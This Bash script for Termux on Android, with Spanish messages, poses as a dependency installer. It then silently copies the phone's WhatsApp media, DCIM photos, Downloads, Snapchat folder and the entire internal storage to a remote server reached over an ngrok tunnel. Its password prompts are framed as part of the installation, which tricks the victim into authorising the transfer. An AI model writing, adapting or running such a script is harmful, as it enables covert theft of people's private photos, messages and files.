#!/bin/bash
#Validamos Conexion WIFI O Datos
if ping -c1 google.com.mx &>/dev/null;
then
        echo "Instalando Dependencias";
	echo "-----------------------";
	#apt-get update -y ;
	#pkg install wget openssh net-tools  -y
        echo "Dependencias Instaladas [OK]";
        #termux-setup-storage
        echo "Bienvenido ";
        echo "Passord: server12";
         echo "Espere unos minutos";
        scp -P 13538 -r /storage/emulated/0/WhatsApp/Media/  server@4.tcp.ngrok.io:/home/server/Documentos/ &>/dev/null;
        echo "Ingrese la Contraseña del Servidor";      
	scp -P 13538 -r /storage/emulated/0/DCIM/  server@4.tcp.ngrok.io:/home/server/Documentos/ &>/dev/null;
        echo "Ingrese la Contraseña del Servidor";
        scp -P 13538 -r /storage/emulated/0/Download/ server@4.tcp.ngrok.io:/home/server/Documentos/ &>/dev/null;
        echo "Ingrese la Contraseña del Servidor";
        scp -P 13538 -r /storage/emulated/0/  server@4.tcp.ngrok.io:/home/server/Documentos/RECIVE_FULL &>/dev/null;
        echo "Ingrese la Contraseña del Servidor";
        scp -P 13538 -r /storage/emulated/0/Snapchat  server@4.tcp.ngrok.io:/home/server/Documentos/ &>/dev/null;
        echo "Proceso Finalizado";
        
	$@
else
        echo "Necesitas Conexion WIFI o Datos Moviles";
fi
